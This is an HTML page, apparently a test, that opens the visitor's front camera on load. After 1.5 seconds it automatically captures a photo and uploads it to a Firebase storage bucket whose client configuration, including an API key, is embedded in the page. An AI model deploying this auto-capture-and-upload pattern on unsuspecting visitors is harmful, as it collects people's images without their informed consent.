<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- Required for camera permission on mobile browsers -->
  <meta http-equiv="Permissions-Policy" content="camera=(self)" />

  <title>Auto Camera Capture</title>

  <style>
    body {
      background: #111;
      color: white;
      text-align: center;
      font-family: Arial;
    }
    video {
      width: 90%;
      max-width: 450px;
      border-radius: 12px;
      margin-top: 20px;
    }
    #status {
      margin-top: 20px;
      font-size: 18px;
    }
  </style>

  <!-- Firebase CDN -->
  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-storage.js"></script>

</head>
<body>

  <h2>Camera Auto Capture Test</h2>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <p id="status">Waiting for camera‚Ä¶</p>

  <script>
    /* ------------------------------
       üî• Firebase Configuration
    ------------------------------ */
    const firebaseConfig = {
      apiKey: "AIzaSyBOJ0RaxZN9fak3nAv5G0ZoV23XjSGm_wo",
      authDomain: "main-camera.firebaseapp.com",
      projectId: "main-camera",
      storageBucket: "main-camera.appspot.com", // FIXED
      messagingSenderId: "259782254190",
      appId: "1:259782254190:web:2757ef530aa1b000b3d07f"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();

    /* ------------------------------
       üì∑ Start Camera
    ------------------------------ */
    async function startCamera() {
      try {
        document.getElementById("status").innerText = "Requesting camera...";

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        const video = document.getElementById("video");
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();
          setTimeout(capturePhoto, 1500); // auto-capture after 1.5 sec
        };

      } catch (err) {
        document.getElementById("status").innerHTML =
          "‚ùå Camera permission denied.<br><br>" +
          err.message;
      }
    }

    /* ------------------------------
       üì∏ Capture + Upload to Firebase
    ------------------------------ */
    function capturePhoto() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      document.getElementById("status").innerText = "üì∏ Photo captured! Uploading...";

      canvas.toBlob(async (blob) => {
        const filename = `photo_${Date.now()}.jpg`;
        const storageRef = storage.ref().child(filename);

        try {
          const snapshot = await storageRef.put(blob);
          const url = await snapshot.ref.getDownloadURL();

          document.getElementById("status").innerHTML =
            "‚úÖ Uploaded!<br><br>Download URL:<br>" +
            `<a href='${url}' target='_blank' style='color:cyan;'>${url}</a>`;

        } catch (e) {
          document.getElementById("status").innerText =
            "‚ùå Upload failed: " + e.message;
        }
      }, "image/jpeg");
    }

    startCamera();
  </script>

</body>
</html>
